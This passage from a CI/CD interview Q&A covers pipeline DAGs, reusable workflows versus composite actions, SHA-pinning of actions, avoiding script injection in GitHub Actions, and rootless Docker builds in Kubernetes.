`resource_group` in GitLab, `concurrency` in GitHub Actions: the jobs queue up.

**What is a DAG in a pipeline?**
A graph of dependencies between jobs (`needs`): a job starts as soon as its dependencies are ready rather than when the whole previous stage finishes. It speeds up pipelines with independent streams of work.

**How does a reusable workflow differ from a composite action?**
A reusable workflow is whole jobs with their own runners, called at the job level (`jobs.<id>.uses`). A composite action is a set of steps executed inside a job as one step (`steps[].uses`).

**Why must third-party actions be pinned by SHA?**
A tag can be moved to another commit. If the action's repository is compromised, the new code runs in your pipeline with access to your secrets. A commit SHA is immutable.

**What is script injection in GitHub Actions?**
Substituting user data (a PR title, a branch name, a comment's text) via `${{ }}` directly into `run`: the expression is substituted into the script text before execution, and a specially crafted title gets executed as a command. Protection — pass such values via `env` and use them as an environment variable.

**How do you build Docker images in CI running in Kubernetes?**
Docker-in-Docker requires a privileged container (effectively root on the node). Mounting the host's `docker.sock` is also root and a shared daemon. Builders without a daemon and without privileges are preferable: BuildKit in rootless mode, Buildah.
